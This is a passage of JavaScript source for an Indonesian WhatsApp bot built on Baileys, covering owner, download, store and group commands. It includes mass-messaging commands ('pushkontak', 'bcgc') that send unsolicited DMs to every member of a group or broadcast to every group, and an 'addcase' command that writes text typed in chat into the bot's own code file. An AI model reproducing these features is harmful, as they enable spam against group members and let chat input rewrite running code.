vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.ownername}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.ownername}@gmail.com\nORG: INI OWNER\nEND:VCARD`
}
await kalz.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": Styles(`My Owner KalzxFluit`), 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./ikal.jpg"),
"mediaUrl": `https://telegra.ph/file/505ebcfe8b2f097bf33d1.jpg`,
"sourceUrl": `https://chat.whatsapp.com/KLwRD2szGxT3FopuOIs5Wh`
}}}, { quoted: fcall })
}
break
case 'addprem':{
if (!isCreator) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await kalz.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break
case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('Sukses!')
} else {
var cekpr = await kalz.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./src/database/premium.json', JSON.stringify(premium))
reply('Sukses!')
}}
break
case 'listpremium': case 'listprem': {
if (!isCreator) return reply(mess.owner)
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = Func.readTime(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
kalz.sendTextWithMentions(m.chat, txt, m)
}
break
case "bcimg": {
if (!isCreator) return reply(`Kamu Owner?`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await loading()
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await kalz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await kalz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await kalz.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply(mess.owner)
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
kalz.sendMessage(i, {text: `${text}`}, {quoted:fcall})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'restart':
if (!isCreator) return reply('wuuu')
reply(`_Restarting KalzxBot . . ._`)
await sleep(3000)
process.exit()
break
case 'runtime': {
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
rin = `*Runtime :* _${runtime(process.uptime())}_\n*Response Speed :* _${latensi.toFixed(4)} Second_\n*Ram :* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: Styles(rin),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'totalfitur': {
reply(`${totalFitur()} Features`)
}
break
case 'delcase': {
if (!isCreator) return reply(`*Access Denied ❌*\n\n*Owners only*`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./X-code.js', q)
reply('*Dellcase Successfully*\n\n© Dellcase By KalzxFluit')
}
break
case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'X-code.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
reply(listCase())
}
break
case "listgc":{
if (!isCreator) return (`KHUSUS OWNER AKU 😁`)
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await kalz.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
case 'tourl': {
if (isBan) return reply2(mess.ban)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await kalz.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//================ D O W N L O A D ==================//
case "ytreels": case "ytmp4":{
if (!text) return reply('Masukan Link Nya!!!')
await loading ()
replay('Tungguin ya')
function getVideoId(url){
    var regExp = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#\&\?]*).*/;
    var match = url.match(regExp);
    return (match&&match[7].length==11)? match[7] : false;
}
let download = await(new Ytdl()).play("https://youtu.be/" + getVideoId(text))
await kalz.sendMessage(m.chat,{
    video: {
    url: download.video["360"].url
    },
    caption: download.title || "Success Download !"
})
}
break
case "mp3": case "ytmp3":{
if (!text) return reply('Masukan Link Nya!!!')
await loading ()
reply('Tungguin ya')
function getVideoId(url){
    var regExp = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#\&\?]*).*/;
    var match = url.match(regExp);
    return (match&&match[7].length==11)? match[7] : false;
}
let download = await(new Ytdl()).play("https://youtu.be/" + getVideoId(text))
kalz.sendMessage(m.chat, {audio: {
url: download.audio["128"].url }, mimetype: 'audio/mpeg',
    caption: download.title || "Success Download !"
})
}
break
case 'tt': case 'tiktok':{
if (!text) return reply(`masukan link tiktoknya`)
let old = new Date()
const dlt = require('./lib/tiktokdl.js')
let tiktuk = await dlt.DownloadTiktok(text)
if (tiktuk.result.images) {
tiktuk.result.images.forEach(async (k) => {
await kalz.sendMessage(m.chat, { image: { url: k }}, { quoted: fcall });
})
} else {
kalz.sendMessage(m.chat, { video: { url: tiktuk.result.video }, caption: `${gris}[ T I K T O K - D O W N L O A D E R ]${gris}\n\n${hiasan}*Author* : ${tiktuk.result.author.nickname}\n${hiasan}*Desc* : ${tiktuk.result.desc}\n${hiasan}*Statistic* : ${tiktuk.result.statistic}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: fcall })
}
}
break
case 'instagram': {
  if (!text) return m.reply('masukkan url video instagram!')
  try {
    let insta = await (await fetch(`https://api.shannmoderz.xyz/downloader/instagram?url=${text}`)).json()
    let shannz = insta.result.output
    kalz.sendMessage( m.chat, { video: { url: shannz.url[0].url }, caption: `${shannz.meta.title}` },{ quoted: m })
  } catch (err) {
      m.reply('masukkan query lainnya atau coba lagi nanti')
    }
}
break
case 'spotify': {
await loading() 
if (!text) return reply(`Contoh : ${prefix + command} dandelion`);
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = ` *🎧 S P O T I F Y*

*Title*: ${api.data[0].title}
*Duration*: ${api.data[0].duration}
*Popular*: ${api.data[0].popularity}
*Url*: ${api.data[0].url}
`
kalz.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": '𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘',
"body": `© Spotify Music`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/f993a3d183150aa3984f1.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: fcall})
const spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
kalz.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘`,
body: "© Spotify Music",
thumbnailUrl: 'https://telegra.ph/file/f7ad1ebdaf077a2419ae2.jpg', 
sourceUrl: hariini,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: fcall
})
}
break
case 'play': {
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *X-Code - V4.0* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Silakan Pilih Type Download Yang Ingin Di Download`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗠𝗣𝟰 🎥\",\"id\":\".playmp4 ${text}\"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗠𝗣𝟯 🎧\",\"id\":\".playmp3 ${text}\"}`
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'playmp3': {
await loading() 
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let wait = await kalz.sendMessage(m.chat, {text: `_Sedang Mencari... [ ${text} ] 🔍_`}, {quoted: fcall, ephemeralExpiration: 86400})
let search = await yts(`${text}`)

let data = await search.all.filter((v) => v.type == 'video')
try {
var res12 = data[0]
} catch {
var res12 = data[1]
}
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./.npm/${search.all[0].views}.mp3`
  let download = await(new Ytdl()).play(ply)
await kalz.sendMessage(m.chat, {text: `_Mengirim.. [ ${text} ] 🔍_`, edit: wait.key }, {quoted: m, ephemeralExpiration: 86400});
kalz.sendMessage(m.chat, {audio: {
url: download.audio["128"].url }, mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {title: `${search.all[0].title}`, body: `Views : ${search.all[0].views}`, thumbnailUrl: res12?.thumbnail, mediaType: 2, mediaUrl: `${search.videos[0].url}`, sourceUrl: `${search.videos[0].url}`, renderLargerThumbnail: true }}})
   }
break

case 'playmp4':{
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let wait = await kalz.sendMessage(m.chat, {text: `_Sedang Mencari... [ ${text} ] 🔍_`}, {quoted: fcall, ephemeralExpiration: 86400})
let search = await yts(`${text}`)
let download = await(new Ytdl()).play(search.videos[0].url)
await kalz.sendMessage(m.chat,{
    video: {
    url: download.video["360"].url
    },
    caption: search.videos[0].title
})
kalz.sendMessage(m.chat, {react: {text: '🎧', key: m.key}})
}
break
//================== S T O R E =======================//
case 'testi1':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 1)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_1.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case 'testi2':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 2)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_2.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case 'testi3':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 3)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_3.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case 'testi4':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 4)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_4.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case 'testi5':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 5)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_5.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case "reqpanel":{
if (!isCreator) return;
ewe = `*بِسۡـــــــــمِ ٱللهِ ٱلرَّحۡـمَـٰنِ ٱلرَّحِـــــــيم*

Ram : 
Username :
Nomor Wa : 
▰▰▰▰▰▰▰▰
*Garansi 14 Day*
*Create ${tanggal2}*
*Hari Ini ${hariini}*`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'tunda':
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxpending,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'proses':
text_proses = `「 𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦 」

𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_proses,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'batal':
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxbatal,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'done': case 'd': {
if (!isCreator) return reply(`Njirr Lu siapa Cuk`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 𝗛𝗔𝗜𝗞𝗔𝗟
𝗗𝗶 𝗧𝘂𝗻𝗴𝗴𝘂 𝗢𝗿𝗱𝗲𝗿𝗮𝗻 𝗦𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗻𝘆𝗮☺️`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'listpanel':{
let list =`Hai Kak ${pushname}

*Pricelist Harga Kalzx Panel* :

1GB RAM/1GB Disk/50% CPU
Rp2.000,00/1 BULAN

2GB RAM/2GB Disk/70% CPU
Rp4.000,00/1 BULAN

3GB RAM/3GB Disk/100% CPU
Rp6.000,00/1 BULAN

4GB RAM/4GB Disk/125% CPU
Rp8.000,00/1 BULAN

5GB RAM/5GB Disk/150% CPU
Rp10.000,00/1 BULAN

6GB RAM/6GB Disk/175% CPU
Rp12.000.00/1 BULAN

7GB RAM/7GB Disk/175% CPU
Rp15.000.00/1 BULAN

8GB RAM/8GB Disk/200% CPU
Rp16.000,00/1 BULAN

UNLI RAM/UNLI Disk/UNLI CPU
Rp10.000,00/1 BULAN

Nb:
Kalau Andah sudah Transfer artinya anda setuju dengan segala kebijakan kami.
Untuk pricelist renew berlaku jika ada server yg masih aktif di dalam akun minimal selama 23hari.

*© KalzxFluit*`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: list,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'sewa': case 'listsewa':
if (isBan) return reply(mess.ban)
await loading()
ewe = `🏷 *List Harga Sewa Bot Kalzx* 

🔏 3 hari = 10k
🔏 1 minggu = 15k
🔏 2 minggu = 25k
🔏 1 bulan = 40k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'sewabot':
if (isBan) return reply(mess.ban)
if (!text) return reply(`*Contoh* :\n#sewabot 1 minggu `)
await loading()
let cret = await kalz.groupCreate(args.join(" "), [])
let ky = await kalz.groupInviteCode(cret.id)
kalz.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${ky}
`, m})
reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
//=================== G R O U P =====================//
case 'totag': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
if (!isAdmins) return reply(mess.admin)
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
kalz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break
case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
let response = await kalz.groupInviteCode(from)
kalz.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'resetlinkgc':
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
kalz.groupRevokeInvite(from)
break
case 'sendlinkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await kalz.groupInviteCode(from)
kalz.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
case 'kick': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kalz.groupParticipantsUpdate(from, [users], 'remove')
reply(mess.done)
}
break
case 'add': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kalz.groupParticipantsUpdate(from, [users], 'add')
reply(mess.done)
}
break
case 'promote': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kalz.groupParticipantsUpdate(from, [users], 'promote')
reply(mess.done)
}
break
case 'demote': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kalz.groupParticipantsUpdate(from, [users], 'demote')
reply(mess.done)
}
break
case 'hidetag': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
await loading()
kalz.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:fcall})
}
break
case 'tagall': {
if (!isAdmins) return reply(mess.admin)
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
kalz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:fcall })
}
break

case 'pushkontak2':{
if (!isCreator) return reply(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await kalz.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
kalz.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;
case 'pushkontak':{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(`di group coy`)
if (!text) return reply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
kalz.sendMessage(geek, {text: `${teksnye}`}, {quoted:fcall})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case "cekidgc": {
if (!isCreator) return reply(mess.premium)
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await kalz.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'getidgc':
if (!m.isGroup) return reply('kusus Group')
ewe = `${m.chat}`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'join': {
if (!isCreator) return reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await kalz.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

